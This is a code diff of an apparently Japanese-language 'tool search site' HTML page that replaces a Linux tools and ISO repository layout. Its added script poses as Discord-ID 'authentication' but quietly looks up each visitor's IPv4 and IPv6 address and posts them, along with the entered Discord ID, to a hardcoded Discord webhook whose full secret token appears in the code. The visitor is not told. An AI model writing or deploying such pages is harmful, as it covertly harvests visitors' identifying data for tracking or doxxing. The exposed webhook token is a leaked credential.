@@ -1,49 +1,129 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ja">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Linux Tools and ISO Repository</title>
-  <link rel="stylesheet" href="styles.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ツール検索サイト</title>
+    <style>
+        body {
+            font-family: 'Courier New', Courier, monospace;
+            background-color: #000;
+            color: #fff;
+            margin: 0;
+            padding: 20px;
+        }
+        .layer {
+            display: none;
+        }
+        .active {
+            display: block;
+        }
+        input, button, select {
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid #00ff00;
+            background-color: #1a1a1a;
+            color: #00ff00;
+        }
+        button {
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #00ff00;
+            color: #000;
+        }
+    </style>
 </head>
 <body>
-  <div id="layer2" class="layer">
-    <h2>Discord IDを入力してください</h2>
-    <form id="auth-form">
-      <input type="text" id="discord-id" placeholder="Discord ID" required>
-      <button type="submit">送信</button>
+
+<div id="authLayer" class="layer active">
+    <h2>認証レイヤー</h2>
+    <input type="text" id="discordId" placeholder="Discord ID" required>
+    <button onclick="authenticate()">認証</button>
+</div>
+
+<div id="toolLayer" class="layer">
+    <h2>ツールの検索/投稿</h2>
+    <form id="toolForm">
+        <input type="text" id="toolName" placeholder="名前" required>
+        <input type="text" id="toolCategory" placeholder="カテゴリ" required>
+        <input type="text" id="toolDescription" placeholder="説明" required>
+        <input type="text" id="toolInstallation" placeholder="インストール方法" required>
+        <button type="button" onclick="submitTool()">投稿</button>
     </form>
-  </div>
+</div>
 
-  <div id="layer1" class="layer" style="display: none;">
-    <header>
-      <img src="assets/logo.png" alt="Logo" id="logo">
-      <h1>Linux Tools & ISO Repository</h1>
-    </header>
+<script>
+    async function getIPAddresses() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return {
+                ipv4: data.ip,
+                ipv6: await getIPv6()
+            };
+        } catch (error) {
+            console.error('IPアドレスの取得エラー:', error);
+            return { ipv4: '取得失敗', ipv6: '取得失敗' };
+        }
+    }
 
-    <nav>
-      <ul>
-        <li><a href="#iso">ISO Files</a></li>
-        <li><a href="#tools">Submit Tool</a></li>
-      </ul>
-    </nav>
+    async function getIPv6() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json&ipv6=true');
+            const data = await response.json();
+            return data.ip;
+        } catch (error) {
+            console.error('IPv6の取得エラー:', error);
+            return '取得失敗';
+        }
+    }
 
-    <section id="iso">
-      <h2>Available ISO Files</h2>
-      <ul id="iso-list"></ul>
-    </section>
+    async function authenticate() {
+        const discordId = document.getElementById('discordId').value;
+        const { ipv4, ipv6 } = await getIPAddresses();
 
-    <section id="tools">
-      <h2>Submit a Tool</h2>
-      <form id="tool-form">
-        <input type="text" id="tool-name" placeholder="Tool Name" required>
-        <textarea id="tool-description" placeholder="Description" required></textarea>
-        <input type="text" id="tool-distro" placeholder="Supported Distributions" required>
-        <button type="submit" class="submit-button">Submit Tool</button>
-      </form>
-    </section>
-  </div>
+        const webhookUrl = 'https://discord.com/api/webhooks/1290225314022031402/7JCLF2tHFCNnmAO-7xZ1UtQbOJILBkclyGfxt3KYI7buXWMvV-ND6_607i6WzdeJ2Ycy';
+        const data = {
+            content: `新しい認証: Discord ID: ${discordId}, IPv4: ${ipv4}, IPv6: ${ipv6}`
+        };
 
-  <script src="script.js"></script>
+        fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(data)
+        })
+        .then(response => {
+            if (response.ok) {
+                switchToToolLayer();
+            } else {
+                alert("認証に失敗しました。");
+            }
+        })
+        .catch(error => {
+            console.error('エラー:', error);
+            alert("認証中にエラーが発生しました。");
+        });
+    }
+
+    function switchToToolLayer() {
+        document.getElementById('authLayer').classList.remove('active');
+        document.getElementById('toolLayer').classList.add('active');
+    }
+
+    function submitTool() {
+        const toolData = {
+            name: document.getElementById('toolName').value,
+            category: document.getElementById('toolCategory').value,
+            description: document.getElementById('toolDescription').value,
+            installation: document.getElementById('toolInstallation').value
+        };
+
+        alert("ツールが投稿されました！" + JSON.stringify(toolData));
+    }
+</script>
+
 </body>
 </html>
